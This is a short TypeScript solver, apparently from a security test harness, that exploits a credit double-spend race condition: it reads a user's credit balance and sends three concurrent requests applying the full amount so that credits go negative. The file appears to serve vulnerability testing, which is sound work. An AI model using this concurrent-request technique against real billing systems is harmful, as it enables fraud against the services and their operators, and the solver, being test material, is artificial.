// Credit double spend: apply the full balance several times concurrently so every request clears the
// availability check against the same starting balance and drives credits negative.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  const billing = await ctx.fetch(ctx.path('getBilling'), { session: owner })
  const credits = Number(billing.json?.credits ?? 0)
  if (credits <= 0) return
  const amountField = ctx.plan.params.amount ?? 'amount'
  const apply = (): Promise<unknown> =>
    ctx.fetch(ctx.path('applyCredit'), { method: 'POST', session: owner, body: { [amountField]: credits } })
  await Promise.all([apply(), apply(), apply()])
}
